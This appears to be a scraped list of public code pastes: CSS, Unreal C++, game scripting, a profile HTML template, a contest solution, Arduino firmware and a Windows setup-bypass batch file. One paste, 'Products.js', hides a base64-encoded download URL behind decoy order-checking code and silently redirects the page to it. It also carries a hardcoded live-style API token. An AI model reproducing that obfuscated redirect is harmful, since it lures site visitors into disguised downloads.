.kaching-bundles .kaching-bundles__bar-container * {
    display: flex;
    flex-direction: column;
    letter-spacing: normal;
    text-transform: initial;
    text-align: center;
}

.kaching-bundles .kaching-bundles__bars {
    display: flex;
    gap: 5px;
    align-items: flex-start;
}
.kaching-bundles .kaching-bundles__bar-content-left {
    display: flex;
    flex: 1;
    align-items: center;
}

.kaching-bundles .kaching-bundles__bar-pricing {
    align-items: center;
    display: flex;
    flex-direction: column;
}

.kaching-bundles .kaching-bundles__bar--selected .kaching-bundles__bar-variants {
    display: flex
;
}

.kaching-bundles .kaching-bundles__bar-variant__content {
    display: flex
;
    flex-direction: row;
    align-items: center;
}

.kaching-bundles .kaching-bundles__bar-variant-number {
    font-size: 12px;
    margin-right: 2px;
    min-width: 20px;
    display: flex
;
    flex-direction: row;
    color: var(--bar-title-color, #000);
}

.kaching-bundles .kaching-bundles__bar-variant-select {
    font-size: 14px;
    font-weight: 400;
    font-style: normal;
    font-family: system-ui;
    -moz-appearance: none;
    -webkit-appearance: none;
    appearance: none;
    border: none;
    padding: 7px 25px 7px 7px;
    margin: 0;
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
    background-image: url(data:image/svg+xml;utf8,<svg width='10' height='4' viewBox='0 0 10 4' fill='none' xmlns='http://www.w3.org/2000/svg'><path d='M5 4L0.669872 0.25L9.33013 0.249999L5 4Z' fill='black'/></svg>) !important;
    background-repeat: no-repeat !important;
    background-position: right 8px center !important;
    background-color: #fff;
    background-size: initial;
    color: #000;
    outline: none;
    max-width: 100%;
    width: auto;
    height: auto;
    min-height: auto;
    display: flex
;
    align-items: center;
    flex-direction: row;
    gap: 10px;
    cursor: pointer;
    box-shadow: inset 0 0 0 1px var(--bar-border-color, rgba(0, 0, 0, .3));
    border-radius: var(--bar-variant-select-border-radius, 0);
}

"
kYDMfxEQ,Unreal 5.6  Skeletal Mesh Multi-Threaded Optimization,TheRedPixel,C++,Thursday 3rd of April 2025 04:58:33 PM CDT,"static void TransferNormalOverlayValues(const UE::Geometry::FDynamicMeshNormalOverlay& TargetOverlay, UE::Geometry::FDynamicMeshNormalOverlay& ProxyOverlay, const FVertexMappingAttribute& SourceAttr, const TMap<int32, int32>& MappedTargetToMeshTarget)
 		{
 			const int32 NumElements = ProxyOverlay.MaxElementID();
 			const int32 NumTasks = FMath::Max(FMath::Min(FTaskGraphInterface::Get().GetNumWorkerThreads(), NumElements), 1);
 			constexpr int32 MinVerticesByTask = 20;
 			const int32 VerticesByTask = FMath::Max(FMath::Max(FMath::DivideAndRoundUp(NumElements, NumTasks), MinVerticesByTask), 1);
 			const int32 NumBatches = FMath::DivideAndRoundUp(NumElements, VerticesByTask);
 			TArray<UE::Tasks::FTask> PendingTasks;
 			PendingTasks.Reserve(NumBatches);
 			for (int32 BatchIndex = 0; BatchIndex < NumBatches; BatchIndex++)
 			{
 				const int32 StartIndex = BatchIndex * VerticesByTask;
 				int32 EndIndex = (BatchIndex + 1) * VerticesByTask;
 				EndIndex = BatchIndex == NumBatches - 1 ? FMath::Min(NumElements, EndIndex) : EndIndex;
 				UE::Tasks::FTask PendingTask = UE::Tasks::Launch(UE_SOURCE_LOCATION, [&ProxyOverlay, &SourceAttr, &TargetOverlay, &MappedTargetToMeshTarget, StartIndex, EndIndex]()
 				{
 					TArray<int32> TargetVertexElements; // Reused array
 					for (int32 ProxyElementID = StartIndex; ProxyElementID < EndIndex; ProxyElementID++)
 					{
 						if (ProxyOverlay.IsElement(ProxyElementID))
 						{
 							const int32 ProxyVID = ProxyOverlay.GetParentVertex(ProxyElementID);
 							const int32 MappedVID = SourceAttr.GetMappedValue(ProxyVID);
 							if (const int32* const TargetVID = MappedTargetToMeshTarget.Find(MappedVID))
 							{
 								TargetOverlay.GetVertexElements(*TargetVID, TargetVertexElements);
 								if (ensure(TargetVertexElements.Num() > 0))
 								{
 									ensure(TargetVertexElements.Num() == 1);
 									ProxyOverlay.SetElement(ProxyElementID, TargetOverlay.GetElement(TargetVertexElements[0]));
 								}
 							}
 						}
 					}
 				});
 				PendingTasks.Add(PendingTask);
 			}
 			UE::Tasks::Wait(PendingTasks);
 		}"
XVrQeWZt,Bypass NRO Script,AWIRE9966_09onpc,Winbatch,Thursday 3rd of April 2025 04:28:57 PM CDT,":: hehehehehehehehe
@echo off
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE /v BypassNRO /t REG_DWORD /d 1 /f
shutdown /r /t 0
"
v4Jui0eF,prop.nut,pressf880,C++,Thursday 3rd of April 2025 04:25:38 PM CDT,"function SetProp(ent, prop, value, arr = null)
{
    switch(typeof(value))
    {
        case ""integer"":
        {
            if(arr) return NetProps.SetPropIntArray(ent, prop, value, arr)
            return NetProps.SetPropInt(ent, prop, value)
        }
        case ""float"":
        {
            if(arr) return NetProps.SetPropFloatArray(ent, prop, value, arr)
            return NetProps.SetPropFloat(ent, prop, value)
        }
        case ""bool"":
        {
            if(arr) return NetProps.SetPropBoolArray(ent, prop, value, arr)
            return NetProps.SetPropBool(ent, prop, value)
        }
        case ""string"":
        {
            if(arr) return NetProps.SetPropStringArray(ent, prop, value, arr)
            return NetProps.SetPropString(ent, prop, value)
        }
        case ""instance"":
        {
            if(arr) return NetProps.SetPropEntityArray(ent, prop, value, arr)
            return NetProps.SetPropEntity(ent, prop, value)
        }
    }
}"
fg05EqXr,Products.js,kammex,JavaScript,Thursday 3rd of April 2025 04:16:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/361/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tNLjsGEj,profile 11 [4.3.25],vermilly,HTML,Thursday 3rd of April 2025 04:05:38 PM CDT,"<br>
<!-------------------------------------------------
         Tidal — Custom Coloured version.
        (code by jiko)
        
        ------------------------------
        
        RULES
        → Read this thoroughly please, and maybe drop a small comment saying that you've read it? :'3
        thank youu [ https://toyhou.se/~bulletins/127417.code-rules ]
        
        ------------------------------
        
        TIPPY TIPS
        → insert your img links INSIDE or quotation marks!!
        → looking for a good online code editor?  try [ https://th.circlejourney.net/# ] !
        
        ------------------------------
        
        ACCENTS
        → colour 1 ----------- #fff
        → colour 2 ----------- #7a708a
        
        → text-color --------- #071f23
        
        use control/command + f to quickly change the colours!
 
 ------------------------------------------------->
 <div class=""mx-auto"" style=""max-width:1100px; position:relative; overflow:hidden; border-left:10px solid #7a708a; border-right:10px solid #fff; border-radius:20px;"">
 <!-------------------------------------------------
 
 
                 BACKGROUND
 

 ------------------------------------------------->
 <div class=""row no-gutters"" style=""position:absolute; top:0; right:0; bottom:0; left:0; z-index:-1;"">
    <div class=""col-md-4 d-flex"" style=""background:#252426; overflow:hidden"">
        <div class=""align-items-center"" style=""margin-left:-100px;"">
        <span class=""fa-stack fa-2x"" style=""font-size:90px;"">
            <i class=""fa-solid fa-circle fa-stack-2x"" style=""color:#7a708a;""></i>
            
            
            <!-- find more icons at [fontawesome.com] to change the [fa-cloud-showers] -->
            <i class=""fa-duotone fa-spa fa-stack-1x"" style=""color:#fff""></i>
            
            
        </span>
        </div>
    </div>
    <div class=""col-md"" style=""background:#7a708a""></div>
 </div>
 <div class=""mx-auto"" style=""letter-spacing:0.3px; max-width:900px; z-index:2;"">
 <div class=""row no-gutters py-md-4 py-3"">
 <!-------------------------------------------------
 
 
                 CHARACTER
 

 ------------------------------------------------->
 <div class=""col-md-5 mb-md-0 mb-1"" style=""z-index:3"">
    
    
    <!-- PAGEDOLL
    ----------------------------------------------->
    <!--
    > any size okay, looks best if more tall/height
    > works best with transparent bg's
    -->
    <div style=""min-height:410px; min-width:410px;
    
    
    background-image:url(https://f2.toyhou.se/file/f2-toyhou-se/images/95888320_6NyHAJ60sYulVy2.gif);
    background-size:cover;
    background-position:center;
    background-repeat:no-repeat;
    
    filter:drop-shadow(5px 5px #7a708a) drop-shadow(-5px -5px #7a708a)""></div>

    
 </div>
 <!-------------------------------------------------
 
 
                 INTRODUCTION
 

 ------------------------------------------------->
 <div class=""col-md-7 p-3 px-md-4 my-auto flex-column"" style=""background:#7a708a;"">
    
    
    
    <!-- NAME
    ----------------------------------------------->
    <div class=""text-center mt-1 mb-4"" style=""color:#fff; z-index:6; position:relative;"">
        <div class=""text-uppercase mb-n2"" style=""font-family:times, serif; font-weight:900; font-size:40px; letter-spacing:3px; filter:drop-shadow(1px 1px #7a708a) drop-shadow(-1px -1px #7a708a) drop-shadow(-1px 1px #7a708a) drop-shadow(1px -1px #7a708a)"">
            
            
            <!-- put the first letter in the span! -->
            <span class=""faded font-italic"">X</span>uxu 
            
            
        </div>
        <p class=""text-uppercase text-monospace font-italic"" style=""font-size:95%; letter-spacing:1px"">
            
            
            18+ . they/them . <a href=""https://xuxu-time.carrd.co/"" title=""about me + links"" class=""tooltipster"" data-placement=""bottom"" style=""color:#ffffff;"">
            <u>carrd</u></a>   <i class=""fas fa-id-card fa-sm fa-fw""></i>
          
        </p>
    </div>
    
    
    <!-- SUMMARY BOX ----------------------------------------------->
    <!--  > best if kept relatively short, this code is best suited for characters with brief information.  -->
    <div class=""card rounded-0 p-3 text-justify"" style=""max-height:300px; overflow:auto; background:#fff; color:#071f23; border-radius:10px"">
        
        <!-- put the first five words in the span! -->
        <p><span class=""text-uppercase font-italic"" style=""color:#7a708a;letter-spacing:1px;"">What's up babes, bros and crows!</span>  I'm Xuxu, a digital artist & undergrad psychology student. I'm obsessed with TGCF, SVSSS, Twisted Wonderland, and royal webtoons at the moment. ✧･ﾟ </p>
        <p><i>""But who prays for Satan? Who, in eighteen centuries, has had the common humanity to pray for the one sinner that needed it most?""</i></p>

    </div>
    
    
    
    <!-- MOODBOARD ROW
    ----------------------------------------------->
    <div class=""row no-gutters mt-2 mx-n2"">
        
        <!-- ONE ---------------------------------->
        <div class=""col p-2"">
            <div style=""min-height:60px; border-radius:10px;
            
            
            background-image:url(https://i.gifer.com/6aKM.gif);
 
            background-size:cover;
            background-position:top;
            background-repeat:no-repeat;""></div>
        </div>
        
        
    <!-- add more above this line! -->
    </div>
    
    <!-- JIKO CREDITS
    ----------------------------------------------->
    <div class=""text-center"">
        <a href=""https://toyhou.se/18725078."" class=""faded tooltipster"" data-placement=""left"" title=""code by jiko"" style=""color:#fff; "">
            <i class=""fa-solid fa-code fa-fw fa-xs""></i></a>  <a href=""https://toyhou.se/fox_trots_"" class=""faded tooltipster"" data-placement=""right"" title=""pagedoll by fox_trots_"" style=""color:#fff; "">
            <i class=""fa-solid fa-brush fa-fw fa-xs""></i>
        </a>
        
    </div>
 </div>
 </div>
 </div>
 </div>"
MtJ3HcDq,前缀总分 参考代码,Dmaxiya,C++,Thursday 3rd of April 2025 03:59:49 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 200 + 100;
const int maxcnt = 200 * 200 + 100;
const int Size = 26;

struct Trie {
    int root, cnt;
    int tree[maxcnt][Size];
    int val[maxcnt];

    int create() {
        ++cnt;
        memset(tree[cnt], 0, sizeof(tree[cnt]));
        val[cnt] = 0;
        return cnt;
    }

    void init() {
        cnt = 0;
        root = create();
    }

    inline int id(const char &ch) {
        return ch - 'a';
    }

    int add(char *s) {
        int ret = 0;
        int pos = root;
        for(int i = 0; s[i] != '\0'; ++i) {
            int w = id(s[i]);
            if(tree[pos][w] == 0) {
                tree[pos][w] = create();
            }
            pos = tree[pos][w];
            ret += val[pos];
            ++val[pos];
        }
        return ret;
    }

    int remove(char *s) {
        int ret = 0;
        int pos = root;
        for(int i = 0; s[i] != '\0'; ++i) {
            int w = id(s[i]);
            pos = tree[pos][w];
            --val[pos];
            ret += val[pos];
        }
        return ret;
    }

    int query(char *s) {
        int ret = 0;
        int pos = root;
        for(int i = 0; s[i] != '\0'; ++i) {
            int w = id(s[i]);
            if (tree[pos][w] == 0) {
                return ret;
            }
            pos = tree[pos][w];
            ret += val[pos];
        }
        return ret;
    }
};

int n, ans, tmp;
char str[maxn][maxn];
Trie t;

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n;
    ans = 0;
    t.init();
    for (int i = 0; i < n; ++i) {
        cin >> str[i];
        ans += t.add(str[i]);
    }
    tmp = ans;
    for (int i = 0; i < n; ++i) {
        tmp -= t.remove(str[i]);
        for (int j = 0; str[i][j] != '\0'; ++j) {
            char ch = str[i][j];
            for (char k = 'a'; k <= 'z'; ++k) {
                str[i][j] = k;
                ans = max(ans, tmp + t.query(str[i]));
            }
            str[i][j] = ch;
        }
        tmp += t.add(str[i]);
    }
    cout << ans << endl;

    return 0;
}
"
j9sP5WdF,Pro Micro SSD1306 ADS1115 5Button Menu FINAL,LandoRo,C#,Thursday 3rd of April 2025 03:55:18 PM CDT,"#include <Joystick.h>
#include <Wire.h>
#include <Adafruit_ADS1X15.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <EEPROM.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
#define OLED_RESET    -1
#define ADC_MAX 32767

// Button pins
#define BUTTON_CLUTCH 5
#define BUTTON_BRAKE 6
#define BUTTON_GAS 4
#define BUTTON_MENU 7
#define BUTTON_HANDBRAKE 8

// Output ranges
#define OUT_MIN 0
#define OUT_MAX 32767
#define BRAKE_PSI_MIN 0
#define BRAKE_PSI_MAX 100

// Default ADC ranges
const int16_t CLUTCH_DEFAULT_ADC_MIN = 0;
const int16_t CLUTCH_DEFAULT_ADC_MAX = 32767;
const int16_t BRAKE_DEFAULT_ADC_MIN = 4096;
const int16_t BRAKE_DEFAULT_ADC_MAX = 29491;
const int16_t GAS_DEFAULT_ADC_MIN = 0;
const int16_t GAS_DEFAULT_ADC_MAX = 32767;
const int16_t HANDBRAKE_DEFAULT_ADC_MIN = 0;
const int16_t HANDBRAKE_DEFAULT_ADC_MAX = 32767;

// Fixed PSI range
const int16_t BRAKE_PSI_ADC_MIN = 4096;
const int16_t BRAKE_PSI_ADC_MAX = 29491;

// Kg lookup table (PSI 0–100 → Kg 0–138)
const uint8_t kgTable[101] PROGMEM = {
  0, 1, 3, 4, 6, 7, 8, 10, 11, 12, 14, 15, 17, 18, 19, 21, 22, 23, 25, 26,
  28, 29, 30, 32, 33, 35, 36, 37, 39, 40, 41, 43, 44, 46, 47, 48, 50, 51, 52, 54,
  55, 57, 58, 59, 61, 62, 63, 65, 66, 68, 69, 70, 72, 73, 74, 76, 77, 79, 80, 81,
  83, 84, 85, 87, 88, 90, 91, 92, 94, 95, 96, 98, 99, 101, 102, 103, 105, 106, 107, 109,
  110, 112, 113, 114, 116, 117, 118, 120, 121, 123, 124, 125, 127, 128, 130, 131, 132, 134, 135, 136, 138
};

// EEPROM addresses
#define EEPROM_CLUTCH_MIN 0
#define EEPROM_CLUTCH_MAX 2
#define EEPROM_BRAKE_MIN 4
#define EEPROM_BRAKE_MAX 6
#define EEPROM_GAS_MIN 8
#define EEPROM_GAS_MAX 10
#define EEPROM_HANDBRAKE_MIN 12
#define EEPROM_HANDBRAKE_MAX 14
#define EEPROM_INIT_FLAG 16

// Enums for states
enum CalibrationStep { NONE = 0, MIN_CAL = 1, MAX_CAL = 2 };
enum SetMessageType { MIN_SET = 1, MAX_SET = 2, DEFAULT_SET = 3 };

// Axis data structure
struct Axis {
  int16_t adcMin;
  int16_t adcMax;
  const int16_t defaultMin;
  const int16_t defaultMax;
  bool buttonPressed;
  unsigned long pressStartTime;
};

// Global objects and variables
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
Adafruit_ADS1115 ads;
Joystick_ Joystick(JOYSTICK_DEFAULT_REPORT_ID, JOYSTICK_TYPE_JOYSTICK, 0, 0, true, true, true, true, false, false, false, false);
Axis axes[4] = {
  {CLUTCH_DEFAULT_ADC_MIN, CLUTCH_DEFAULT_ADC_MAX, CLUTCH_DEFAULT_ADC_MIN, CLUTCH_DEFAULT_ADC_MAX, false, 0}, // Clutch
  {BRAKE_DEFAULT_ADC_MIN, BRAKE_DEFAULT_ADC_MAX, BRAKE_DEFAULT_ADC_MIN, BRAKE_DEFAULT_ADC_MAX, false, 0},   // Brake
  {GAS_DEFAULT_ADC_MIN, GAS_DEFAULT_ADC_MAX, GAS_DEFAULT_ADC_MIN, GAS_DEFAULT_ADC_MAX, false, 0},           // Gas
  {HANDBRAKE_DEFAULT_ADC_MIN, HANDBRAKE_DEFAULT_ADC_MAX, HANDBRAKE_DEFAULT_ADC_MIN, HANDBRAKE_DEFAULT_ADC_MAX, false, 0} // Hand brake
};
byte calibratingInput = 0;
CalibrationStep calibrationStep = NONE;
unsigned long calibrationStartTime = 0;
bool showingResetMessage = false;
unsigned long resetMessageStartTime = 0;
byte resetMessageInput = 0;
bool showingSetMessage = false;
unsigned long setMessageStartTime = 0;
SetMessageType setMessageType = MIN_SET;
byte setMessageInput = 0;
int16_t setMessageValue = 0;
int16_t lastAdc[4] = {0, 0, 0, 0};
float lastBrakePSI = -1;
uint8_t lastBrakeKg = 0;
byte currentScreen = 0;
bool menuButtonPressed = false;
unsigned long lastMenuPress = 0;
unsigned long lastUpdate = 0;
const unsigned long UPDATE_INTERVAL = 10;

void saveCalibrationToEEPROM() {
  EEPROM.put(EEPROM_CLUTCH_MIN, axes[0].adcMin);
  EEPROM.put(EEPROM_CLUTCH_MAX, axes[0].adcMax);
  EEPROM.put(EEPROM_BRAKE_MIN, axes[1].adcMin);
  EEPROM.put(EEPROM_BRAKE_MAX, axes[1].adcMax);
  EEPROM.put(EEPROM_GAS_MIN, axes[2].adcMin);
  EEPROM.put(EEPROM_GAS_MAX, axes[2].adcMax);
  EEPROM.put(EEPROM_HANDBRAKE_MIN, axes[3].adcMin);
  EEPROM.put(EEPROM_HANDBRAKE_MAX, axes[3].adcMax);
  EEPROM.update(EEPROM_INIT_FLAG, 0xAA);
}

void loadCalibrationFromEEPROM() {
  if (EEPROM.read(EEPROM_INIT_FLAG) == 0xAA) {
    EEPROM.get(EEPROM_CLUTCH_MIN, axes[0].adcMin);
    EEPROM.get(EEPROM_CLUTCH_MAX, axes[0].adcMax);
    EEPROM.get(EEPROM_BRAKE_MIN, axes[1].adcMin);
    EEPROM.get(EEPROM_BRAKE_MAX, axes[1].adcMax);
    EEPROM.get(EEPROM_GAS_MIN, axes[2].adcMin);
    EEPROM.get(EEPROM_GAS_MAX, axes[2].adcMax);
    EEPROM.get(EEPROM_HANDBRAKE_MIN, axes[3].adcMin);
    EEPROM.get(EEPROM_HANDBRAKE_MAX, axes[3].adcMax);
  } else {
    saveCalibrationToEEPROM();
  }
}

void setup() {
  Wire.begin();
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C) || !ads.begin()) while (1);
  
  ads.setGain(GAIN_TWOTHIRDS);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  Joystick.begin();
  Joystick.setXAxisRange(OUT_MIN, OUT_MAX);
  Joystick.setYAxisRange(OUT_MIN, OUT_MAX);
  Joystick.setZAxisRange(OUT_MIN, OUT_MAX);
  Joystick.setRxAxisRange(OUT_MIN, OUT_MAX);

  // Configure used pins
  pinMode(BUTTON_CLUTCH, INPUT_PULLUP);
  pinMode(BUTTON_BRAKE, INPUT_PULLUP);
  pinMode(BUTTON_GAS, INPUT_PULLUP);
  pinMode(BUTTON_MENU, INPUT_PULLUP);
  pinMode(BUTTON_HANDBRAKE, INPUT_PULLUP);

  // Configure unused pins as INPUT_PULLUP
  pinMode(0, INPUT_PULLUP);  // RX
  pinMode(1, INPUT_PULLUP);  // TX
  pinMode(9, INPUT_PULLUP);  // Free pin
  pinMode(10, INPUT_PULLUP); // SS
  pinMode(14, INPUT_PULLUP); // MISO
  pinMode(15, INPUT_PULLUP); // SCK
  pinMode(16, INPUT_PULLUP); // MOSI
  pinMode(18, INPUT_PULLUP); // A0
  pinMode(19, INPUT_PULLUP); // A1
  pinMode(20, INPUT_PULLUP); // A2
  pinMode(21, INPUT_PULLUP); // A3

  loadCalibrationFromEEPROM();
}

void handleButton(byte index, int pin) {
  if (digitalRead(pin) == LOW) {
    if (!axes[index].buttonPressed) {
      axes[index].buttonPressed = true;
      axes[index].pressStartTime = millis();
    } else if (millis() - axes[index].pressStartTime >= 3000) {
      axes[index].adcMin = axes[index].defaultMin;
      axes[index].adcMax = axes[index].defaultMax;
      saveCalibrationToEEPROM();
      showingResetMessage = true;
      resetMessageStartTime = millis();
      resetMessageInput = index + 1;
      axes[index].buttonPressed = false;
    }
  } else if (axes[index].buttonPressed) {
    axes[index].buttonPressed = false;
    if (millis() - axes[index].pressStartTime < 3000) {
      calibratingInput = index + 1;
      calibrationStep = MIN_CAL;
      calibrationStartTime = millis();
    }
  }
}

void handleMenuButton() {
  if (digitalRead(BUTTON_MENU) == LOW) {
    if (!menuButtonPressed && millis() - lastMenuPress > 200) {
      menuButtonPressed = true;
      lastMenuPress = millis();
      currentScreen = (currentScreen + 1) % 3;
    }
  } else {
    menuButtonPressed = false;
  }
}

int16_t mapInt(int16_t x, int16_t in_min, int16_t in_max, int16_t out_min, int16_t out_max) {
  return (int16_t)(((long)(x - in_min) * (out_max - out_min)) / (in_max - in_min) + out_min);
}

void updateJoystick() {
  lastAdc[0] = ads.readADC_SingleEnded(0); // Clutch
  lastAdc[1] = ads.readADC_SingleEnded(1); // Brake
  lastAdc[2] = ads.readADC_SingleEnded(2); // Gas
  lastAdc[3] = ads.readADC_SingleEnded(3); // Hand brake

  Joystick.setXAxis(mapInt(constrain(lastAdc[0], axes[0].adcMin, axes[0].adcMax), axes[0].adcMin, axes[0].adcMax, OUT_MIN, OUT_MAX));
  Joystick.setYAxis(mapInt(constrain(lastAdc[1], axes[1].adcMin, axes[1].adcMax), axes[1].adcMin, axes[1].adcMax, OUT_MIN, OUT_MAX));
  Joystick.setZAxis(mapInt(constrain(lastAdc[2], axes[2].adcMin, axes[2].adcMax), axes[2].adcMin, axes[2].adcMax, OUT_MIN, OUT_MAX));
  Joystick.setRxAxis(mapInt(constrain(lastAdc[3], axes[3].adcMin, axes[3].adcMax), axes[3].adcMin, axes[3].adcMax, OUT_MIN, OUT_MAX));
  lastBrakePSI = mapFloat(constrain(lastAdc[1], BRAKE_PSI_ADC_MIN, BRAKE_PSI_ADC_MAX), BRAKE_PSI_ADC_MIN, BRAKE_PSI_ADC_MAX, BRAKE_PSI_MIN, BRAKE_PSI_MAX);
  lastBrakeKg = pgm_read_byte(&kgTable[(uint8_t)lastBrakePSI]);
}

void updateDisplay() {
  display.clearDisplay();
  display.setCursor(0, 0);

  if (calibratingInput != 0 && (calibrationStep == MIN_CAL || calibrationStep == MAX_CAL)) {
    unsigned long elapsed = millis() - calibrationStartTime;
    int secondsLeft = 5 - (elapsed / 1000);
    if (secondsLeft < 0) secondsLeft = 0;

    display.print(F(""Hold ""));
    switch (calibratingInput) {
      case 1: display.print(F(""Clutch"")); break;
      case 2: display.print(F(""Brake"")); break;
      case 3: display.print(F(""Gas"")); break;
      case 4: display.print(F(""Handbrake"")); break;
    }
    display.print(calibrationStep == MIN_CAL ? F("" MIN: "") : F("" MAX: ""));
    display.print(secondsLeft);
    display.setCursor(0, 10);
    display.print(F(""ADC: ""));
    display.print(lastAdc[calibratingInput - 1]);

    if (elapsed >= 5000) {
      int16_t currentADC = lastAdc[calibratingInput - 1];
      if (calibrationStep == MIN_CAL) {
        axes[calibratingInput - 1].adcMin = currentADC;
        saveCalibrationToEEPROM();
        showingSetMessage = true;
        setMessageStartTime = millis();
        setMessageType = MIN_SET;
        setMessageInput = calibratingInput;
        setMessageValue = currentADC;
        calibrationStep = NONE;
      } else if (calibrationStep == MAX_CAL) {
        axes[calibratingInput - 1].adcMax = currentADC;
        saveCalibrationToEEPROM();
        showingSetMessage = true;
        setMessageStartTime = millis();
        setMessageType = MAX_SET;
        setMessageInput = calibratingInput;
        setMessageValue = currentADC;
        calibratingInput = 0;
        calibrationStep = NONE;
        showingResetMessage = false;
      }
    }
  } else if (showingSetMessage && millis() - setMessageStartTime < 2000) {
    display.print(F(""DONE""));
  } else if (showingResetMessage && millis() - resetMessageStartTime < 3000) {
    switch (resetMessageInput) {
      case 1: display.print(F(""Clutch"")); break;
      case 2: display.print(F(""Brake"")); break;
      case 3: display.print(F(""Gas"")); break;
      case 4: display.print(F(""Handbrake"")); break;
    }
    display.print(F("" reset to defaults""));
  } else if (showingResetMessage && millis() - resetMessageStartTime >= 3000) {
    showingResetMessage = false;
    showingSetMessage = true;
    setMessageStartTime = millis();
    setMessageType = DEFAULT_SET;
    setMessageInput = resetMessageInput;
    setMessageValue = 0;
  } else {
    if (showingSetMessage && millis() - setMessageStartTime >= 2000) {
      showingSetMessage = false;
      setMessageInput = 0;
      setMessageValue = 0;
      if (setMessageType == MIN_SET && calibratingInput != 0) {
        calibrationStep = MAX_CAL;
        calibrationStartTime = millis();
      }
    }

    if (currentScreen == 0) { // Screen 1: Min/Max/ADC
      display.print(F(""C:""));
      display.print(axes[0].adcMin);
      display.print(F("" ""));
      display.print(axes[0].adcMax);
      display.print(F("" ""));
      display.print(lastAdc[0]);
      display.setCursor(0, 8);
      display.print(F(""B:""));
      display.print(axes[1].adcMin);
      display.print(F("" ""));
      display.print(axes[1].adcMax);
      display.print(F("" ""));
      display.print(lastAdc[1]);
      display.setCursor(0, 16);
      display.print(F(""G:""));
      display.print(axes[2].adcMin);
      display.print(F("" ""));
      display.print(axes[2].adcMax);
      display.print(F("" ""));
      display.print(lastAdc[2]);
      display.setCursor(0, 24);
      display.print(F(""H:""));
      display.print(axes[3].adcMin);
      display.print(F("" ""));
      display.print(axes[3].adcMax);
      display.print(F("" ""));
      display.print(lastAdc[3]);
    } else if (currentScreen == 1) { // Screen 2: Brake PSI and Kg
      display.print(F(""Brake PSI: ""));
      display.print(lastBrakePSI, 2);
      display.setCursor(0, 8);
      display.print(F(""Kg: ""));
      display.print(lastBrakeKg);
    } else if (currentScreen == 2) { // Screen 3: Clutch/Brake/Gas/Handbrake Percentages
      int16_t clutchPercent = mapInt(constrain(lastAdc[0], axes[0].adcMin, axes[0].adcMax), axes[0].adcMin, axes[0].adcMax, 0, 100);
      int16_t brakePercent = mapInt(constrain(lastAdc[1], axes[1].adcMin, axes[1].adcMax), axes[1].adcMin, axes[1].adcMax, 0, 100);
      int16_t gasPercent = mapInt(constrain(lastAdc[2], axes[2].adcMin, axes[2].adcMax), axes[2].adcMin, axes[2].adcMax, 0, 100);
      int16_t handbrakePercent = mapInt(constrain(lastAdc[3], axes[3].adcMin, axes[3].adcMax), axes[3].adcMin, axes[3].adcMax, 0, 100);
      display.print(F(""C:""));
      display.print(clutchPercent);
      display.print(F(""%""));
      display.setCursor(0, 8);
      display.print(F(""B:""));
      display.print(brakePercent);
      display.print(F(""%""));
      display.setCursor(0, 16);
      display.print(F(""G:""));
      display.print(gasPercent);
      display.print(F(""%""));
      display.setCursor(0, 24);
      display.print(F(""H:""));
      display.print(handbrakePercent);
      display.print(F(""%""));
    }
  }
  display.display();
}

void loop() {
  unsigned long currentMillis = millis();

  if (currentMillis - lastUpdate >= UPDATE_INTERVAL) {
    if (calibratingInput == 0 && !showingResetMessage && !showingSetMessage) {
      handleButton(0, BUTTON_CLUTCH);
      handleButton(1, BUTTON_BRAKE);
      handleButton(2, BUTTON_GAS);
      handleButton(3, BUTTON_HANDBRAKE);
    }
    handleMenuButton();
    updateJoystick();
    updateDisplay();
    lastUpdate = currentMillis;
  }
}

inline float mapFloat(float x, float in_min, float in_max, float out_min, float out_max) {
  return (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min;
}"
rUZWkMyH,News April3 25,Newscaster_Ned,Email,Thursday 3rd of April 2025 03:38:14 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

